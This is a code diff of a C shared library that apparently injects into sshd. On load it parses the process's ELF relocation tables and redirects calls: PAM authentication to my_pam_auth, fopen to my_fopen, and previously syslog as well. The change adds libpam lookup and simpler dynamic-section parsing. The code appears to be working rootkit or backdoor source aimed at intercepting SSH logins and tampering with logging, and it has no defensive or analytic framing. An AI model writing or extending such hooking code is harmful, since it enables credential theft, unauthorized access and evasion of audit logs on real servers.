@@ -87,8 +87,8 @@ static void *get_libstart(struct link_map *link_map, char *lib)
  * TODO: there is probably a way to get the correct number of elements in a .dynamic array
  *	so we don't blow something up
  */
-static void parse_dyn_array(Elf64_Dyn *dynptr, int elements, Elf64_Rela **RELA,
-					 uint64_t **RELASZ, Elf64_Rela **JMPREL, uint64_t **PLTRELSZ)
+static void parse_dyn_array(Elf64_Dyn *dynptr,Elf64_Rela **RELA, uint64_t **RELASZ,
+								Elf64_Rela **JMPREL, uint64_t **PLTRELSZ)
 {
 	*RELA = NULL;
 	*RELASZ = NULL;
@@ -96,8 +96,7 @@ static void parse_dyn_array(Elf64_Dyn *dynptr, int elements, Elf64_Rela **RELA,
 	*PLTRELSZ = NULL;	
 
 	int i;
-
-	for (i = 0; i < elements; i++) {
+	for (i = 0; dynptr[i].d_tag != DT_NULL; i++) {
 		if (dynptr[i].d_tag == DT_RELA)
 			*RELA = (Elf64_Rela *) &dynptr[i].d_un;
 		else if (dynptr[i].d_tag == DT_JMPREL)
@@ -132,19 +131,23 @@ static Elf64_Rela *parse_rela(Elf64_Rela *RELA, uint64_t *RELASZ, void *func, in
 			return RELA;
 		}
 
-		RELA = (Elf64_Rela *) ((char *) RELA + (unsigned long long) (sizeof(Elf64_Rela)));
+		/*if ((void *) RELA[0].r_offset == func) {
+			*type = RELOC_OFFSET;
+			return RELA;
+		} */
+
+		RELA = (Elf64_Rela *) ((char *) RELA + (uint64_t) (sizeof(Elf64_Rela)));
 	}
 	return NULL;
 }
 
 /*
  * the callback for dl_iterate_phdr
- *
- * TODO: make null1/null2 not suck
  */
+Elf64_Dyn *libpam;
 static int callback(struct dl_phdr_info *info, size_t size, void *data)
 {
-	if (null1 != NULL && null2 != NULL && libc != NULL) /* :speedmeup: */
+	if (null1 != NULL && null2 != NULL && libc != NULL)
 		return 0;	
 
 	int j;
@@ -164,6 +167,10 @@ static int callback(struct dl_phdr_info *info, size_t size, void *data)
 			}
 			if (strstr(info->dlpi_name, "libc.so") != NULL) {
 				libc = (void *) (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr);
+				break;
+			}
+			if (strstr(info->dlpi_name, "libpam.so") != NULL) {
+				libpam = (void *) (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr);
 				break;
 			}
 		}
@@ -290,9 +297,8 @@ void my_pam_syslog(pam_handle_t *pamh, int priority, const char *fmt, ...)
 	fprintf(fp, "in pam_syslog ayylmao\n");
 	fflush(fp);
 	fclose(fp);
-
-
-
+	
+	return;
 }
 
 
@@ -318,12 +324,13 @@ static void  __attribute__ ((constructor)) init(void)
 	if (null1 == NULL)
 		return;
 
+	/* XXX: all of this crap deserves a wrapper - ? muh modularity */
 
 	Elf64_Rela *RELA, *JMPREL;
 	uint64_t *RELASZ, *PLTRELSZ;
 	int type;
 
-	parse_dyn_array(null1, 30, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
+	parse_dyn_array(null1, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
 	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
 		return;
 
@@ -343,20 +350,19 @@ static void  __attribute__ ((constructor)) init(void)
 	signal(SIGSEGV, handle_sig_with_jmp);
 	signal(SIGBUS, handle_sig_with_jmp);
 
-	/* TODO: test type (parse_rela() paramter) */
 	hook_rela(foundrela, my_pam_auth, type);
 
 	signal(SIGSEGV, SIG_DFL);
 	signal(SIGBUS, SIG_DFL);
 
 
-	/* XXX: all of this crap deserves a wrapper - ? muh modularity */
+
 
 	void *libcstart = get_libstart(link_map, "libc.so.6");
 	void *libc_func = find_func_ptr(link_map, libcstart, "fopen");
 
 	/* the relocation of fopen lives within sshd's dynamic */
-	parse_dyn_array(null1, 30, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
+	parse_dyn_array(null1, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
 	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
 		return;
 
@@ -368,29 +374,12 @@ static void  __attribute__ ((constructor)) init(void)
 	if (foundrela == NULL) /* :( */
 		return;
 
-	/* checking type is pretty much a formaility at the moment -- but will be useful later */
+	/* adding RELOC_OFFSET breaks fopen */
 	if (type == RELOC_ADDEND) {
 		ref_fopen = (void *) foundrela->r_addend;
-
 		ref_fopen_Rela = foundrela;
-
-
 		hook_rela(foundrela, my_fopen, type);
 	}
-
-	//libcstart = get_libstart(link_map, "libc.so.6");
-	libc_func = find_func_ptr(link_map, libcstart, "__syslog_chk");
-
-	foundrela = parse_rela(RELA, RELASZ, libc_func, &type);
-	if (foundrela == NULL) /* the relocation wasn't in DT_RELA ... */
-		foundrela = parse_rela(JMPREL, PLTRELSZ, libc_func, &type);
-	
-	if (type == RELOC_INFO)
-		hook_rela(foundrela,  my_syslog_chk, type);
-
-
-	/* TODO: hook pam_syslog */
-	void *pam_syslog = find_func_ptr(link_map, pamstart, "pam_syslog");
 
 
 
